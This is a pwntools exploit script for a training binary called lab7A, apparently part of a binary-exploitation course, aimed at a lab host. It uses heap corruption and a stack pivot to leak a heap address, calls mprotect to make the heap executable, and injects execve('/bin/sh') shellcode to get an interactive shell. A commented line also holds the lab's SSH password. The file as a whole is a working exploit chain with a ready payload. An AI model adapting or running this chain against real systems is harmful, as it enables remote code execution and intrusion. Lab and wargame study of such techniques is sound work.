from pwn import *
from time import sleep
e=ELF("./lab7A")
'''
0x80bdb24 <get_cie_encoding+52>:     add    esp,0x20
0x80bdb27 <get_cie_encoding+55>:     pop    ebx
0x80bdb28 <get_cie_encoding+56>:     pop    esi
0x80bdb29 <get_cie_encoding+57>:     pop    edi
0x80bdb2a <get_cie_encoding+58>:     ret
'''
#I tried to debug on remote:
#s=ssh(user="lab7A",password="us3_4ft3r_fr33s_4re_s1ck",host="192.168.1.15",port=22)
#p=s.run("gdb /levels/lab07/lab7A")
#p.sendline(b"set disable-randomization off")
#p.sendline(b"r")
#sleep(3)

#Local debug:
#p=e.process()
#context.log_level='debug'
#gdb.attach(p,gdbscript="b *print_index+158")

p=remote("192.168.1.15",7741)
def create(size:int,data:bytes):
    p.recv()
    p.sendline(b'1')
    p.recv()
    p.sendline(str(size).encode())
    p.recv()
    sleep(1)
    p.sendline(data)
def edit(index:int,data:bytes):
    p.recv()
    p.sendline(b'2')
    p.recv()
    p.sendline(str(index).encode())
    p.recv()
    sleep(1)
    p.sendline(data)
def print(index:int,ropchain:bytes=b'',leak=True):
    p.recv()
    p.sendline(b'4')
    sleep(1)
    p.recv()
    sleep(1)
    p.sendline(str(index).encode()+b"\x00"*3+ropchain)
    sleep(1)
    if leak:
        return p.recv()[0:4][::-1].hex()
#stage1: call puts(messages) -> leak
create(131,b"B"*131)#0
create(4,b"A"*4)#1
edit(0,b"B"*128+b"C"*12+p32(0x80bdb24))
leak=print(1,b"A"*8+p32(e.sym["puts"])+p32(e.sym['main'])+p32(e.sym["messages"]))
log.info(f"leak: 0x{leak}")
real_heap=int(leak,16)-6616#-14808#-6640
#-6640: my local
#-14808: when the machine turns off alsr
#-6616: when the machine tunrs on alsr
#fuzk this shit
log.info(f"heap: {hex(real_heap)}")

#stage2 call mprotect(heap,7)
p.sendline(b'a')
create(131,b"B"*131)#2
create(4,b"A"*4)#3
edit(3,b"B"*128+b"C"*12+p32(0x80bdb24))
print(1,b"A"*8+p32(e.sym["mprotect"])+p32(e.sym['main'])+p32(real_heap)+p32(0x00ffffff)+p32(7),leak=False)

#stage3 run shellcode
shellcode=b"\x31\xC0\xB8\x2F\x73\x68\x23\x50\x83\x6C\x24\x03\x23\x68\x2F\x62\x69\x6E\x54\x31\xD2\x31\xC9\x8B\x1C\x24\xB8\x0B\x00\x00\x00\xCD\x80\x83\xC4\x0C"
shellcode_addr=int(leak,16)-6640+8004
log.info(f"shellcode_addr: {hex(shellcode_addr)}")
p.sendline(b'a')
create(131,b"B"*131)#4
create(4,b"A"*4)#5
edit(4,b"B"*128+b"C"*12+p32(shellcode_addr)+b"\x90"*10+shellcode)
print(5,leak=False)

p.interactive()